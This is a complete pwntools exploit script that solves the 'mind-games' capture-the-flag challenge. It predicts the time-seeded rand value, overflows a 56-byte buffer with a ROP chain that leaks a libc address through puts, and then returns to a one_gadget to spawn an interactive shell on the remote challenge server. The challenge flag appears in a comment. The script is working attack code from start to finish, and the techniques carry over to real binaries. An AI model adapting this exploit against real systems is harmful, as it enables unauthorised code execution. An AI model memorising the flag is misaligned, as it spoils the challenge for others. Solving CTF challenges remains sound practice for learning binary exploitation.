#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL

exe = ELF("./mind-games")
libc = CDLL("./lib/libc.so.6")
LIBC = ELF("./lib/libc.so.6")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("pwn.chal.ctf.gdgalgiers.com", 1404)

    return r


def main():
    r = conn()
    
    libc.srand(libc.time(0))
    
    #pause()

    s = libc.rand()
    rand = str(s).encode()
    
    pop_rdi = 0x00000000004014c3
    pop_rsi = 0x00000000004014c1
    writeable = 0x000000003ff000
    

    payload =  rand + b"\x00"
    payload += b"a"*(56 - len(payload))
    payload += p64(pop_rdi)
    payload += p64(0x404030)
    payload += p64(exe.symbols.puts)
    
    payload += p64(exe.symbols.main)
    """payload += p64(pop_rsi)
    payload += p64(writeable)
    payload += p64(0)
    payload += p64(pop_rdi) + p64(0x402049) # %s
    payload += p64(0x4011b0) # scanf"""
    
    r.sendline(payload)
    
    r.recvuntil(b'he mind games!\n')
    libc_base = u64(r.readline().strip().ljust(8, b'\0')) - LIBC.symbols.setbuf
    one_gad = 0xe6c84 + libc_base
    
    print('libc:', hex(libc_base))
    
    libc.srand(libc.time(0))
    
    pause()
    s = libc.rand()
    rand = str(s).encode()
    
    payload =  rand + b"\x00"
    payload += b"a"*(56 - len(payload))
    payload += p64(one_gad)
    
    r.sendline(payload)

    r.interactive() # CyberErudites{Putt1nG_4n_END_to_Th1S_m4DN3s$_0NcE_4Nd_F0r_4Nd_ALl}


if __name__ == "__main__":
    main()
